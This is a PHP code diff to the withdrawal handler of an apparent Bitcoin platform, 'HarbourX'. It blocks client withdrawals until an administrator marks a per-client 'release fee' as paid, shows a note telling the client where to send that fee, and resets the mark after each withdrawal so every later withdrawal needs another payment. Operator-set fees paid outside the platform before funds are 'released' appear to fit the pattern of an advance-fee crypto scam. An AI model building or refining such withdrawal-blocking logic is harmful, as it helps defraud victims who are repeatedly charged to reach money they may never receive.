@@ -95,7 +95,6 @@ $bankAccountId = clean($input['bankAccountId'] ?? '', 80);
 $btcAmount = cleanNumber($input['btcAmount'] ?? 0);
 $localAmount = round(cleanNumber($input['localAmount'] ?? $input['audAmount'] ?? 0), 2);
 $btcLocalRate = cleanNumber($input['btcLocalRate'] ?? $input['btcAudRate'] ?? 0);
-$feeAcknowledged = !empty($input['feeAcknowledged']);
 $currency = strtoupper(trim((string)($users[$index]['currency'] ?? 'USD')));
 if (!preg_match('/^[A-Z]{3}$/', $currency)) $currency = 'USD';
 
@@ -126,19 +125,27 @@ if (!$bank) {
     respond(422, ['success' => false, 'message' => 'Select a connected payout bank account.']);
 }
 
-// Per-client withdrawal fee. Computed here from the stored client settings, never trusted from the request.
+/* Per-client withdrawal fee. Computed here from the stored client settings and
+   never read from the request — including whether it has been paid.
+
+   Only an administrator can mark the fee received, in the client's admin page.
+   Until they do, this returns before anything is written: no money moves, no
+   Bitcoin moves, and no transaction is recorded. The request itself carries no
+   say in the matter; a client who edits it gets the same answer. */
 $feeRequired = !empty($users[$index]['withdrawalFeeRequired']);
+$feePaid = !empty($users[$index]['withdrawalFeePaid']);
 $feeFixed = round(max(0, (float)($users[$index]['withdrawalFeeAmount'] ?? 0)), 2);
 $feePercent = max(0, (float)($users[$index]['withdrawalFeePercent'] ?? 0));
 $feeAmount = $feeRequired ? round(max(0, $feeFixed + ($feePercent / 100) * $localAmount), 2) : 0.0;
-if ($feeRequired && $feeAmount > 0 && !$feeAcknowledged) {
-    // The note says how to pay. A client whose browser is holding fee settings
-    // from before the fee existed has no other copy of it, so send it with the
-    // challenge rather than leaving them the generic line.
+
+if ($feeRequired && $feeAmount > 0 && !$feePaid) {
+    // The note is how the client is told where to send it, and a browser holding
+    // settings from before the fee existed has no copy of its own.
     respond(422, [
         'success' => false,
-        'message' => 'The withdrawal fee must be paid before this request can be submitted.',
+        'message' => 'A release fee is outstanding on this account. It has to be paid, and confirmed by HarbourX, before a withdrawal can be submitted.',
         'feeRequired' => true,
+        'feeAwaitingPayment' => true,
         'fee' => $feeAmount,
         'feeNote' => trim((string)($users[$index]['withdrawalFeeNote'] ?? ''))
     ]);
@@ -210,6 +217,15 @@ if ($fromBalance) {
     $newBtc = round(max(0, $availableBtc - $btcAmount), 8);
     $users[$index]['btc'] = $newBtc;
     $newBalance = $availableBalance;
+}
+
+/* The confirmation is spent by the withdrawal it released. The fee is charged
+   per withdrawal — a fixed amount plus a percentage of this one's value — so a
+   mark that survived would release every later withdrawal on one payment. The
+   next one needs its own confirmation. */
+if ($feeAmount > 0) {
+    $users[$index]['withdrawalFeePaid'] = false;
+    $users[$index]['withdrawalFeePaidAt'] = '';
 }
 
 saveUsers($usersFile, $users);
